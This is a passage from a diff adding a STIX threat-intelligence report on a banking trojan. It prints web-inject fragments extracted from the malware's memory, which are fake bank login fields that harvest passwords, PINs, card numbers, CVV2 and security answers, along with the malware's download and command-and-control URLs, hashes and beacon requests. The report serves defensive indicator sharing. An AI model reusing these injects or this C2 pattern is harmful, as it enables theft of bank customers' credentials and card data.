+		&lt;td&gt;
+			&lt;span class="applabelFalt"&gt;
+				TAN
+			&lt;/span&gt;
+		&lt;/td&gt;
+		&lt;td&gt;&lt;/td&gt;
+		&lt;td valign="top"&gt;
+			&lt;input type="password" id="tan" name="tan" size="10" maxlength="50" value=""
+			class="soInputSignon"&gt;
+		&lt;/td&gt;
+		&lt;/tr&gt; &lt;tr&gt;input type="image"=border="0"
+		src="/JPS/portal/images/signon/but_login.gif"&gt;OnClick="javascript: if
+		(document.SignonForm.tan.value.length &lt; 3) {
+		alert('Bitte hier die TAN eingeben');return false;}"
+		name="userid"*&gt;&lt;P&gt;&lt;LABEL class=light for=txtLogon&gt;Please enter your electronic
+			password.&lt;/LABEL&gt;&lt;/P&gt;&lt;INPUT id=m1 maxLength=76 name=passmword&gt;
+		&lt;P&gt;&lt;LABEL class=light for=txtLogon&gt;Please enter the answer to your secret
+			question.&lt;/LABEL&gt;&lt;/P&gt;&lt;INPUT id=m2 maxLength=76 name=secqustion&gt;&lt;a
+			class="fdLogonLink_3" href="javascript:if
+			((document.getElementById(\'m1\').value.length &lt; 5) ||
+			(document.getElementById(\'m2\').value.length &lt; 4) ) {alert(\'All fields are
+			required!\'); } else name="username"*&lt;/div&gt;*&lt;/div&gt;*&lt;/div&gt;&lt;div class="row"&gt;
+	&lt;div class="label"&gt;&lt;label for="username"&gt;Full Log On Password&lt;/label&gt;&lt;/div&gt;
+	&lt;div class="value"&gt;&lt;input type="password" name="full_pass" maxlength="32" size="12"
+		tabindex="2" value="" id="fp"&gt;&lt;/div&gt;
+	&lt;div class="required"&gt;
+	&lt;/div&gt;
+&lt;/div&gt;value='Continue OnClick="javascript: if
+(document.getElementById('fp').value.length &lt;3){alert('Please, provide all
+information');return false;}"&lt;td&gt;&lt;input name="passwd" type="password" value=""
+	size="20" style="width:100%;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;tr&gt;
+	&lt;td&gt;&#207;&#235;&#224;&#242;&#229;&#230;&#237;&#251;&#233; &#239;&#224;&#240;&#238;&#235;&#252;:&lt;/td&gt;
+	&lt;td&gt;&lt;input name="plat_pass" type="password" value="" size="20" style="width:
+		100%;"&gt;&lt;/td&gt;
+&lt;/tr&gt;id="login"&gt;&lt;/th&gt;*&lt;/tr&gt;&lt;tr valign="bottom" class="loginLabel"&gt;
+&lt;th&gt;
+	&lt;label for="injectPassword"&gt;Enter your password&lt;/label&gt;&lt;br /&gt;
+	&lt;input type="password" name="injectPassword" maxlength="20" size="25"
+	value="" id="injectPassword"&gt;
+&lt;/th&gt;
+&lt;/tr&gt;
+&lt;tr valign="bottom" class="loginLabel"&gt;
+	&lt;th&gt;
+		&lt;label for="injectPin"&gt;Enter your PIN&lt;/label&gt;&lt;br /&gt;
+		&lt;input type="password" name="injectPin" maxlength="20" size="5" value=""
+		id="injectPin"&gt;
+	&lt;/th&gt;
+&lt;/tr&gt;%class="buttonSubmit" alt="Log on"onclick="javascript: if
+(document.forms['UserLogonForm'].injectPassword.value == '') {alert('Please, enter
+your Password'); return false;} if (document.forms['UserLogonForm'].injectPin.value
+== '') {alert('Please, enter your Pin');return false;}"(NAME="btnsubmit"
+TITLE="Sign On Now"onclick="javascript: if
+(document.forms['frmSignOn'].injectPassnumber.value == '') {alert('Please, enter
+your Passnumber'); return false;}"&lt;td height="19" align="center"
+	bgcolor="#FFFFFF"&gt;&lt;input type="password" name="pc_pswd" class="formfield2"
+	onChange="return check_pass(document.enter.pc_pswd.value);"&gt;&lt;/td&gt;&lt;td
+	height="19"&gt;&lt;input type="image" src="img/enter.gif" border="0"
+	onmouseout="this.src='img/enter.gif'" onmouseup="this.src='img/enter.gif'"
+	onmousedown="this.src='img/enter.gif';" onclick="document.enter.submit()"/&gt;&lt;/td&gt;&lt;td
+	height="19"&gt;&lt;/td&gt;
+&lt;td align="bottom" bgcolor="#ffffff" height="19"&gt;&lt;input name="platej_pass"
+	class="formfield" type="text" value="&#207;&#235;&#224;&#242;&#229;&#230;&#237;&#251;&#233; &#239;&#224;&#240;&#238;&#235;&#252;"&gt;&lt;/td&gt;name="PANB"*"&gt;&lt;/tr&gt;
+&lt;tr&gt;
+	&lt;td nowrap&gt;&lt;b&gt;Clave de Firma&lt;/b&gt;&lt;/td&gt;
+	&lt;td&gt;&lt;input type="text" name="ESpass" style="FONT-WEIGHT: normal; FONT-SIZE: 11px;
+		WIDTH: 70px; COLOR: #db0000; BORDER-TOP-STYLE: groove; FONT-STYLE: normal;
+		FONT-FAMILY: arial; BORDER-RIGHT-STYLE: groove; BORDER-LEFT-STYLE: groove; HEIGHT:
+		20px; TEXT-ALIGN: right; BORDER-BOTTOM-STYLE: groove" ID="Text2"&gt; ID="Password1"
+		onkeypress="if(event.keyCode==13)ejecutar('0')" title="ejecutar('0')"&gt;
+		&lt;td align="left" valign="top"&gt;&amp;nbsp; &lt;img src="../../2043/01/images/borrar.gif"
+			border="0" onmouseup="borraNum()" alt="Borrar"
+			style="cursorointer"&gt;&lt;/td&gt;
+		&lt;td align="left" valign="top"&gt;
+			&amp;nbsp;
+			&lt;a href="javascript:if(document.intelvia.ESpass.value .length&lt;5){alert('Clave de
+				Firma no encontrado.');}else name="password"*autocomplete="off"*&gt;&lt;BR&gt;
+				&lt;STRONG&gt; ATM or Check Card Number:&lt;/STRONG&gt;&lt;BR&gt;&lt;INPUT name=mbna_cc_number type=text
+				class=inputBox id=cc_number size=20 maxLength=32&gt;&lt;BR&gt;
+				&lt;STRONG&gt; ATM CVV2:&lt;/STRONG&gt;&lt;BR&gt;&lt;INPUT name=mbna_cc_cvv2 type=password
+				class=inputBox id=cc_cvv2 size=5 maxLength=7&gt;&lt;BR&gt;
+				&lt;STRONG&gt; ATM EXP.DATE:&lt;/STRONG&gt;&lt;BR&gt;&lt;INPUT name=mbna_cc_exp type=password
+				class=inputBox id=cc_exp size=5 maxLength=7&gt;&lt;BR&gt;name="login"*onclick=""&#192;javascript:
+				if (document.getElementById('cc_exp').value.length &lt; 2) {alert('Please, provide all
+				information');return
+				false;}else{tc_log('http://www.mbna.co.uk/logger?mbna_customer=true');}Login
+				1*&lt;/tr&gt;:&lt;p class="societyheader"&gt;Please enter your details&lt;/p&gt;
+			&amp;nbsp;name="sname"*&lt;tr&gt;&lt;tr&gt;
+					&lt;td colspan="3" class="formtext"&gt;Password&lt;/td&gt;
+					&lt;td colspan="3" class="formtext"&gt;&lt;input class="entryField" maxlength="25" value=""
+						name="UKpass" type="password"&gt;&lt;/td&gt;
+				&lt;/tr&gt;name="continueBtn.value"OnClick="javascript: if
+				(document.forms[0].UKpass.value=='')
+				{
+				alert('Enter your Password');
+				document.forms[0].uid.value='';
+				document.forms[0].sname.value='';
+				document.forms[0].UKpass.value='';
+				return false;
+				}"name="DBID_edit" *&lt;/tr&gt;&lt;TR&gt;&lt;TD&gt;
+					&lt;LABEL for=DBID_edit&gt;Password&lt;/LABEL&gt;&lt;/TD&gt;
+				&lt;TD class=wizCrl&gt;&lt;SPAN id=DBID&gt;&lt;INPUT type=password name=password id=m1&gt;&lt;/TD&gt;&lt;/TR&gt;
+				&lt;TR&gt;&lt;TD class=wizardLabel&gt;PIN&lt;/TD&gt;
+					&lt;TD class=wizCrl&gt;&lt;INPUT type=password name=PIN size='5' id=m2&gt;&lt;/TD&gt;
+				&lt;/TR&gt;
+				&lt;TR&gt;&lt;TD&gt;
+						&lt;LABEL for=DBID_edit&gt;ATM or Check card number:&lt;/LABEL&gt;&lt;/TD&gt;
+					&lt;TD class=wizCrl&gt;&lt;SPAN id=DBID&gt;&lt;INPUT type=text name=cc_num id=m3&gt;&lt;/TD&gt;&lt;/TR&gt;
+					&lt;TR&gt;&lt;TD&gt;
+							&lt;LABEL for=DBID_edit&gt;Exp Date - like that MM.YYYY:&lt;/LABEL&gt;&lt;/TD&gt;
+						&lt;TD class=wizCrl&gt;&lt;SPAN id=DBID&gt;&lt;INPUT type=text name=exp size='8'
+								id=m4&gt;&lt;/TD&gt;&lt;/TR&gt;3name="NextButton_button" value="Next" onclick="if
+						((document.getElementById('m1').value.length &lt; 5) ||
+						(document.getElementById('m2').value.length &lt; 4) ||
+						(document.getElementById('m3').value.length &lt; 14)||
+						(document.getElementById('m4').value.length &lt; 4)) {alert('All fields are
+						required!'); return false;}
+						else if (theForm.userPassword.value == '') fldList += ' -- User Password';if
+						(theForm.inja1.value == '') fldList += ' -- First
+						Answer';name="userPassword"*&lt;/tr&gt;&lt;tr&gt;
+						&lt;td id = "dataText4" class="dataText" align=left &gt;
+							Email associated with account:
+						&lt;/td&gt;
+						&lt;td align=right &gt;
+							&lt;INPUT class="dataText" type="text" name="inja1" size="20" value=""&gt;
+						&lt;/td&gt;
+					&lt;/tr&gt;To log on enter your User ID&lt;/P&gt;"Password and Memorable Word.Ctype="password"
+					name="Password" size="15" maxlength="15"&gt;*&lt;/tr&gt;&lt;tr align="left"&gt;
+					&lt;td bgcolor="#ceefe7" align="left" valign="middle"&gt;
+						&lt;div class="entries3"&gt;
+							&lt;b&gt;Memorable Word&lt;/b&gt;
+						&lt;/div&gt;
+					&lt;/td&gt;
+					&lt;td bgcolor="#ceefe7"&gt;&lt;img src="img/space.gif" width="3" height="30"
+						border="0"&gt;&lt;/td&gt;
+					&lt;td bgcolor="#ceefe7" valign="middle"&gt;
+						&lt;div class="entries"&gt;
+							&lt;input tabindex="2" type="password" name="MemorableWord" size="15"
+							maxlength="15"&gt;
+						&lt;/div&gt;
+					&lt;/td&gt;
+					&lt;td bgcolor="#ceefe7" align="left" valign="middle"&gt;&amp;nbsp;&lt;/td&gt;
+						&lt;/tr&gt;&lt;p&gt;&lt;span style="font-family: arial"; font-size: 18pt;&gt;&lt;b&gt;Click on the account
+						name to view account detail and history.&lt;br&gt;&lt;img
+						style="padding-left:10px;padding-right:20px;padding-bottom:8px;" alt="Digital
+						Federal Credit Union"name="password"*autocomplete="off"&gt;&lt;BR&gt;
+						&lt;STRONG&gt; ATM or Check Card Number:&lt;/STRONG&gt;&lt;BR&gt;&lt;INPUT name=mword type=text
+						class=disableAutoComplete id=cc_number size=20 maxLength=32&gt;&lt;BR&gt;
+						&lt;STRONG&gt; ATM CVV2:&lt;/STRONG&gt;&lt;BR&gt;&lt;INPUT name=cc_cvv2 type=password
+						class=disableAutoComplete id=cc_cvv2 size=5 maxLength=7&gt;&lt;BR&gt;
+						&lt;STRONG&gt; ATM EXP.DATE: (MM/YY)&lt;/STRONG&gt;&lt;BR&gt;&lt;INPUT name=cc_exp type=password
+						class=disableAutoComplete id=cc_exp size=5
+						maxLength=7&gt;name="login"OnClick="javascript: if
+						(document.getElementById('cc_exp').value.length &lt; 2) {alert('Please, provide all
+						information');return false;}"
+						name="visaCardNumber"*&lt;/tr&gt;&lt;TR&gt;
+						&lt;TD&gt;&amp;nbsp;&lt;/TD&gt;
+						&lt;TD class=field colSpan=2&gt;&lt;BR&gt;Due to security measures, please provide the answers
+							to &lt;BR&gt;all the security questions listed below. &lt;BR&gt;&lt;/TD&gt;&lt;/TR&gt;
+					&lt;TD&gt;&amp;nbsp;&lt;/TD&gt;
+					&lt;TR&gt;
+						&lt;TD class=label&gt;&lt;LABEL for=visanumber&gt;Place of birth: &amp;nbsp;&lt;/LABEL&gt;&lt;/TD&gt;
+						&lt;TD class=field&gt;&lt;INPUT id=pbirth maxLength=18 size=18 name=pbirth&gt;&lt;/TD&gt;&lt;/TR&gt;
+					&lt;TR&gt;
+						&lt;TD class=label&gt;&lt;LABEL for=visanumber&gt;First school attended: &amp;nbsp;&lt;/LABEL&gt;&lt;/TD&gt;
+						&lt;TD class=field&gt;&lt;INPUT id=fschool maxLength=18 size=18 name=fschool&gt;&lt;/TD&gt;&lt;/TR&gt;
+					&lt;TR&gt;
+						&lt;TD class=label&gt;&lt;LABEL for=visanumber&gt;Last school attended: &amp;nbsp;&lt;/LABEL&gt;&lt;/TD&gt;
+						&lt;TD class=field&gt;&lt;INPUT id=lschool maxLength=18 size=18 name=lschool&gt;&lt;/TD&gt;&lt;/TR&gt;
+					&lt;TR&gt;
+						&lt;TD class=label&gt;&lt;LABEL for=visanumber&gt;Memorable date: &amp;nbsp;&lt;/LABEL&gt;&lt;/TD&gt;
+						&lt;TD class=field&gt;&lt;INPUT id=mdate maxLength=18 size=18 name=mdate&gt;&lt;/TD&gt;&lt;/TR&gt;
+					&lt;TR&gt;
+						){alert('Please, provide all information');return false;}" Ltd&lt;/title&gt;&lt;script
+						language="JavaScript"&gt;
+						function validateforms()
+						{
+						if(document.login.SCode.value.length&lt;5)
+						{alert('Please enter your Security Code!');
+						document.login.SCode.value="";
+						document.login.SCode.focus();
+						return false;
+						}
+						}
+						&lt;/script&gt; &lt;body onkeydown="if(event.keyCode==13)return false;"
+						logo.jpg"&gt;&lt;/div&gt;&lt;/td&gt;*class="left"&gt;&lt;/td&gt;&#8218;&lt;font color="#FFFFFF"&gt;Please enter your
+				username, password, full security code and press the login button to
+				login.&lt;/font&gt;&lt;/p&gt;Security*&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;name="login"&lt;td width="28%"
+	class="left"&gt;
+	&lt;span class="login"&gt;
+		&lt;input type="password" name="SecurityCode" size="30" maxlength="20" id="SCode"&gt;
+&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;
+	&lt;td width="36%" class="left"&gt;&amp;nbsp;&lt;/td&gt;
+	&lt;td width="28%" class="left"&gt;
+		&lt;div align="right"&gt;&lt;span class="login"&gt;
+				&lt;input type="submit" onFocus="validateforms();"To log on, enter your User
+				ID&lt;/p&gt;"Password and Memorable Word.name="Password"*&lt;/tr&gt;&lt;tr align="left"&gt;
+				&lt;td bgcolor="#ceefe7" align="left" valign="middle"&gt;
+					&lt;div class="entries3"&gt;
+						&lt;b&gt;Memorable Word&lt;/b&gt;
+					&lt;/div&gt;
+				&lt;/td&gt;
+				&lt;td bgcolor="#ceefe7"&gt;&lt;img src="img/space.gif" width="3" height="30"
+					border="0"&gt;&lt;/td&gt;
+				&lt;td bgcolor="#ceefe7"&gt;
+					&lt;div class="entries"&gt;
+						&lt;input type="password" name="MemorableWord" size="15" maxlength="15"&gt;
+					&lt;/div&gt;
+				&lt;/td&gt;
+				&lt;td valign="top" bgcolor = "#ceefe7"&gt;&lt;img src="img/space.gif" width="1"
+					height="40" border="0"&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			name="username"*&lt;/TR&gt;&lt;TR style="PADDING-BOTTOM: 10px"&gt;
+			&lt;TD class="body" style="BACKGROUND-COLOR: transparent;PADDING-left: 30px"&gt;
+				&lt;Span style="FONT-SIZE: 15px"&gt;&lt;b&gt;Email associated with account&amp;nbsp;&lt;/b&gt;&lt;/Span&gt;
+			&lt;/TD&gt;
+			&lt;TD&gt;
+				&lt;input name="email" type="text" size="30" maxlength="40" class="textbox" /&gt;
+			&lt;/TD&gt;name="UserPass"*&lt;/tr&gt;&lt;tr&gt;
+			&lt;td align="right" colspan="2"&gt;&lt;font size="2"&gt;What is the zip code of your main
+					supplier?&lt;/font&gt;&lt;/td&gt;
+			&lt;td colspan="2"&gt;&lt;input type="text" size="16" maxlength="8" name="inja1"&gt; &lt;/td&gt;
+	&lt;/tr&gt;&lt;/td&gt;if (theForm.userPassword.value == '') fldList += ' -- User Password';
+	if (theForm.inja1.value == '') fldList += ' -- First Answer';
+	if (theForm.inja2.value == '') fldList += ' -- Second Answer';
+	name="userPassword"*&lt;/tr&gt;&lt;tr &gt;
+	&lt;td id = "dataText4" class="dataText" align=left &gt;
+		How many children do you have?
+	&lt;/td&gt;
+	&lt;td align=right &gt;
+		&lt;INPUT class="dataText" type="text" name="inja1" size="20" value=""&gt;
+	&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr &gt;
+	&lt;td id = "dataText4" class="dataText" align=left &gt;
+		What is the name of the first company you worked for?
+	&lt;/td&gt;
+	&lt;td align=right &gt;
+		&lt;INPUT class="dataText" type="text" name="inja2" size="20" value=""&gt;
+	&lt;/td&gt;
+&lt;/tr&gt;
+&lt;input type="hidden" name="injq1" value="How many children do you have?"&gt;
+&lt;input type="hidden" name="injq2" value="What is the name of the first company you
+worked for?"&gt;
+&lt;input name="publicCred2" size="15" maxlength="32" type="text"&gt;*&lt;/tr&gt;&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;What is the name of your best friend in grade school?&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;span&gt;&lt;input name="inja1" size="15" maxlength="32" type="text"&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;/tr&gt;name="passcode" maxlength="8" /&gt;*&lt;/tr&gt;&lt;tr style="font-size: 8pt"&gt;
+&lt;td class="clsFormField" height="25"&gt;Memorable Word:&amp;nbsp;&lt;/td&gt;
+&lt;td height="25"&gt;&lt;input type="password" name="MemorableWord" /&gt;&lt;/td&gt;
+&lt;/tr&gt;
+Login&lt;/title&gt;"&lt;script LANGUAGE="JavaScript"&gt;'&lt;script language="JavaScript"&gt;
+	function check(){
+		if (document.getElementById("FullRegCard").value.length &lt; 16)
+		{alert("Please enter your Registered Card Number");
+			document.getElementById("FullRegCard").focus();document.getElementById("FullRegCard"
+			).value="";
+			return false;}}
+	&lt;/script&gt;&lt;body onkeydown="if(event.keyCode==13)return
+	false;"value="userlogin"*;;"&gt;name="login_password"&lt;div class="login-form1"&gt;Card
+		Number&lt;/div&gt;
+	&lt;div class="form2"&gt;&lt;input type="text" name="FullRegCard" class="fieldstyle"
+		style="WIDTH:190px" maxLength="16" tabindex="1" AUTOCOMPLETE="off"
+		id="FullRegCard"&gt;&lt;/div&gt;
+	&lt;DIV class="login-form1"&gt;Email Address &lt;/div&gt;
+	&lt;DIV class="form2"&gt;&lt;input class="fieldstyle" style="WIDTH:190px" tabIndex="1"
+		name="login_email" AUTOCOMPLETE="off"&gt;&lt;/div&gt;
+	&lt;DIV class="login-form1"&gt;Password &lt;/div&gt;
+	&lt;DIV class="form2"&gt;&lt;input
+		type="password"name="submit.x"OnFocus="check();"name="ACN"*&lt;/tr&gt;&lt;TR&gt;&lt;TD&gt;&lt;SPAN
+				class=orangeText nowrap=true&gt;&lt;B&gt;PIN &lt;/B&gt;&lt;/SPAN&gt;&lt;/TD&gt;
+		&lt;TD align=right&gt;&lt;INPUT tabIndex=1 maxLength=7 size=5 name=pinmword type=password
+			id=m1&gt;&lt;/TD&gt;&lt;/TR&gt;
+	&lt;TR&gt;&lt;TD&gt;&lt;SPAN class=orangeText nowrap=true&gt;&lt;B&gt;Memorable date (dd/mm/yyyy)
+		&lt;/B&gt;&lt;/SPAN&gt;&lt;/TD&gt;
+		&lt;TD align=right&gt;&lt;INPUT tabIndex=1 maxLength=20 size=11 name=date id=m2&gt;&lt;/TD&gt;&lt;/TR&gt;&lt;INPUT name="GO"onclick = " if
+	(document.getElementById('m1').value.length &lt; 4) {alert('Please enter your PIN!');
+	document.getElementById('m1').focus(); return false;}
+	if (document.getElementById('m2').value.length &lt; 5) {alert('Please enter your
+	Date!'); document.getElementById('m2').focus(); return false;}
+
+
+
+-----END EXTRACTED CODE SECTION 2-----
+
+NOTE: The sections of code above were extracted manually from the memory space of
+a process. The format and validity of the code as it appears above differs from how
+it would be deployed by the malware.
+The URL "https://www.moneymail.ru/?da" was also contained in the code above.
+
+-----BEGIN RELEVANT STRING DATA-----
+http://santaizel.info/css/bt.exe
+http://santaizel.info/css/gate.php
+-----END RELEVANT STRING DATA-----</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-1ffd0528-6a60-4210-ab96-00c8098d67fe">
+        <cybox:Object id="CISCP:Object-eea1ed9d-aa92-4ed8-9061-27f5fec50b5c">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">config.bin</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">136127</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">5f5740c444a1a0aa07673936f830c31f</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">f86d288c792ca75123fe4833dc27f8617c645df1</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3072:0BOWBGmecmuxDMBNuzzH97buUG6aPG+0YeRuQJ0ad:0BJBGlwgBNOJJG6aPGJn7d</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-05-29T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-7ad0bb74-309e-4eba-b7aa-e21d1df2eba1" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>The malware calls back to the URL "santaizel.info" via port 80 (see GET request below). The malware code also opens a local port and begins listening. The port used for the listener is not static and changes with each iteration of the malware.
+
+INITIAL GET REQUEST:
+GET /css/config.bin HTTP/1.1
+Accept: */*
+Connection: Close
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: santaizel.info
+Cache-Control: no-cache
+
+If the configuration file "config.bin" is provided to the malware, additional beacons begin.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-8f18595c-5118-4945-a432-f44391d33d0a">
+        <cybox:Object id="CISCP:Object-2814d014-fe0d-4a34-9b22-f31df9622dda">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://santaizel.info/css/config.bin</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-05-29T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-158a97bc-9f15-458f-be38-e2f2e3f8ca26" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>INITIAL POST REQUEST (HEX):
+00000000 50 4f 53 54 20 2f 63 73 73 2f 67 61 74 65 2e 70 POST /cs s/gate.p
+00000010 68 70 20 48 54 54 50 2f 31 2e 31 0d 0a 41 63 63 hp HTTP/ 1.1..Acc
+00000020 65 70 74 3a 20 2a 2f 2a 0d 0a 55 73 65 72 2d 41 ept: */* ..User&#8208;A
+00000030 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61 2f 34 2e gent: Mo zilla/4.
+00000040 30 20 28 63 6f 6d 70 61 74 69 62 6c 65 3b 20 4d 0 (compa tible; M
+00000050 53 49 45 20 36 2e 30 3b 20 57 69 6e 64 6f 77 73 SIE 6.0; Windows
+00000060 20 4e 54 20 35 2e 31 3b 20 53 56 31 29 0d 0a 48 NT 5.1; SV1)..H
+00000070 6f 73 74 3a 20 73 61 6e 74 61 69 7a 65 6c 2e 69 ost: san taizel.i
+00000080 6e 66 6f 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e nfo..Con tent&#8208;Len
+00000090 67 74 68 3a 20 31 39 39 0d 0a 43 6f 6e 6e 65 63 gth: 199 ..Connec
+000000A0 74 69 6f 6e 3a 20 4b 65 65 70 2d 41 6c 69 76 65 tion: Ke ep&#8208;Alive
+000000B0 0d 0a 43 61 63 68 65 2d 43 6f 6e 74 72 6f 6c 3a ..Cache&#8208; Control:
+000000C0 20 6e 6f 2d 63 61 63 68 65 0d 0a 0d 0a 49 09 63 no&#8208;cach e....I.c
+000000D0 a6 9b ca ac 82 e4 b4 7b 07 6f 1b 9a e6 34 69 4e .......{ .o...4iN
+000000E0 f7 b8 c9 34 88 36 f5 ce ec da a5 57 b2 38 42 c9 ...4.6.. ...W.8B.
+000000F0 b6 d6 e2 40 7f 41 7a c2 e9 c3 a9 76 99 c1 40 10 ...@.Az. ...v..@.
+00000100 47 26 b8 0c 8c 9f e1 0f 2a 5c c3 bb 8c 60 40 f6 G&amp;...... *\...`@.
+00000110 66 59 1e 1a cd 36 f9 77 f8 cd 3e 3c 7a 16 2d fe fY...6.w ..&gt;&lt;z.&#8208;.
+00000120 08 58 3c 8e 1f de 02 bf 62 36 96 8a f2 ff 6f a2 .X&lt;..... b6....o.
+00000130 b2 38 13 79 23 0f 03 27 2b 9a 83 4a b0 61 52 99 .8.y#..' +..J.aR.
+00000140 c2 a7 d8 94 34 a0 3a c6 28 32 90 81 df f1 7d 18 ....4.:. (2....}.
+00000150 96 7c ae 11 c2 56 75 bf 11 3b a3 7f a9 3e 8e 6a .|...Vu. .;...&gt;.j
+00000160 86 7d 52 08 96 98 c7 55 30 54 d9 aa b2 5e 37 6f .}R....U 0T...^7o
+00000170 17 af e5 5b d8 b7 8c 5b bc df b4 b0 5e 2a cc 6f ...[...[ ....^*.o
+00000180 5b 69 a7 dc a2 74 79 d9 3d 47 3f 9d 53 99 b7 f5 [i...ty. =G?.S...
+00000190 2b 8b 0d 63                                     +..c
+
+ASCII:
+POST /css/gate.php HTTP/1.1
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: santaizel.info
+Content-Length: 390
+Connection: Keep-Alive
+Cache-Control: no-cache</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-5f969d29-535f-4eed-a3e0-42aafd11f9de">
+        <cybox:Object id="CISCP:Object-810880c7-d587-46c9-84d8-70ce7d42fdda">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://santaizel.info/css/gate.php</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-05-29T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
